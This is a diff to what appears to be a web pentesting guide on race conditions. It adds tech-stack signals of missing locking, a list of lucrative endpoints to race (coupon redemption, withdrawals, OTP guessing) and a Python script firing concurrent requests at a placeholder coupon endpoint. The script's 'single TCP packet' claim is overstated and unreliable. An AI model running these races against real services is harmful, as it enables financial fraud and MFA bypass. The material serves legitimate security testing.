@@ -244,18 +244,78 @@ def handleResponse(req, interesting):
     table.add(req)
 ```
 
-### Common Race Condition Targets
+### Race Condition Tech-Stack Signals
 
-| Target | What to Race | Impact |
-|--------|-------------|--------|
-| Coupon/promo redemption | Multiple redemptions | Financial |
-| Money transfer | Double-spend | Financial |
-| Vote/like/follow | Inflate counts | Integrity |
-| Account creation | Duplicate accounts | Logic bypass |
-| File upload + process | Upload before validation | RCE |
-| Invite/referral bonus | Multiple claims | Financial |
-| Password reset | Multiple tokens | Account takeover |
-| 2FA disable + action | Action before 2FA re-enabled | Auth bypass |
+Before investing time in race condition testing, identify whether the target's tech stack is likely vulnerable based on common concurrency patterns:
+
+| Tech Stack | Vulnerable Pattern | Safe Pattern | Signal to Look For |
+|---|---|---|---|
+| Ruby on Rails | `Model.find` → update without `with_lock` | `with_lock { }`, `find_by_sql('SELECT ... FOR UPDATE')` | X-Runtime header, Rails version in cookies |
+| Node.js/Express | `async/await` read-then-write without mutex | Redis WATCH/MULTI, database transactions | X-Powered-By: Express, async response patterns |
+| PHP (Laravel/Symfony) | `$model->save()` without `lockForUpdate()` | `DB::transaction(function() { ... ->lockForUpdate() })` | X-Powered-By: PHP, Laravel debug headers |
+| Python (Django/Flask) | `obj.save()` without `select_for_update()` | `with transaction.atomic(): Model.objects.select_for_update()` | X-Framework: Django, Server: gunicorn/uvicorn |
+| Java (Spring) | `@Transactional` without `PESSIMISTIC_WRITE` | `@Lock(LockModeType.PESSIMISTIC_WRITE)`, `synchronized` | X-Application-Context, Java stack traces |
+| Go | Goroutine read-then-write without sync.Mutex | `sync.Mutex`, `database/sql` with `FOR UPDATE` | Server: Go-HTTP, fast response times |
+| .NET | `async Task` without `SemaphoreSlim` | `lock() { }`, `IsolationLevel.Serializable` | X-AspNet-Version, X-Powered-By: ASP.NET |
+
+### High-Value Race Condition Targets
+
+Prioritize these endpoint patterns (highest ROI):
+
+| Endpoint Pattern | What to Race | Impact if Successful |
+|---|---|---|
+| `/api/redeem`, `/api/coupon/apply` | Apply same coupon N times simultaneously | Financial: N× discount |
+| `/api/transfer`, `/api/withdraw` | Submit same transfer N times | Financial: N× payout |
+| `/api/vote`, `/api/like` | Submit same vote N times | Integrity: vote manipulation |
+| `/api/invite/accept` | Accept invite + change role simultaneously | Privilege escalation |
+| `/api/cart/checkout` | Checkout + modify cart simultaneously | Get items at wrong price |
+| `/api/account/email` | Change email + trigger password reset | Account takeover |
+| `/api/2fa/verify` | Submit multiple OTP guesses simultaneously | MFA bypass |
+
+### HTTP/2 Single-Packet Attack
+
+The most reliable race condition technique (2024+):
+
+```python
+import asyncio
+import httpx
+
+async def race_single_packet(url, headers, data, n=10):
+    """Send N requests in a single TCP packet via HTTP/2 multiplexing."""
+    async with httpx.AsyncClient(http2=True, verify=False) as client:
+        # Prepare all requests
+        tasks = [
+            client.post(url, headers=headers, json=data)
+            for _ in range(n)
+        ]
+        # Fire simultaneously
+        responses = await asyncio.gather(*tasks)
+        
+        for i, r in enumerate(responses):
+            print(f"  [{i}] {r.status_code} — {r.text[:100]}")
+        
+        return responses
+
+# Usage
+asyncio.run(race_single_packet(
+    "https://target.com/api/redeem",
+    {"Authorization": "Bearer TOKEN"},
+    {"coupon_code": "DISCOUNT50"},
+    n=10
+))
+```
+
+### Validation Requirements
+
+**A race condition is confirmed when:**
+- The operation succeeds MORE times than it should (e.g., coupon applied 3x instead of 1x)
+- Reproducible in at least 3/5 attempts
+- The effect is observable in the application state (check balance, check applied coupons, etc.)
+
+**NOT a race condition:**
+- Getting N identical responses (server may process sequentially but return same cached response)
+- Getting N 200 responses without verifying the SIDE EFFECT occurred N times
+- Single successful duplicate (could be eventual consistency, not a race)
 
 ---
 
